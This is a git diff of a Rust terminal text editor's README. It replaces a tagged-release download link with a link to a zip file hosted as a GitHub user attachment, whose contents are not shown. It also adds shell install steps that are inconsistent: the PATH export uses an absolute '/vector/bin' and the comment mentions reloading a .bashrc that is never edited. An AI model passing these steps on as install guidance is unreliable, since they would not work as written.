@@ -6,7 +6,14 @@ A lightweight, terminal-based text editor built in Rust, featuring syntax highli
 
 You can download the latest release here:
 
-[![Download for Linux ](https://img.shields.io/badge/Download-Linux-blue?style=for-the-badge&logo=linux)](https://github.com/xianglii-yao/vector/archive/refs/tags/v1.0.0.tar.gz)
+[![Download for Linux ](https://img.shields.io/badge/Download-Linux-blue?style=for-the-badge&logo=linux)](https://github.com/user-attachments/files/19494030/vector.zip)
+
+Extract the zip to a folder and export path
+```sh
+cd /{folder_name}
+export PATH="/vector/bin:$PATH"
+# now kill the terminal and open new terminal to reload .bashrc file
+```
 
 ## Build from souce for mac/windows
 
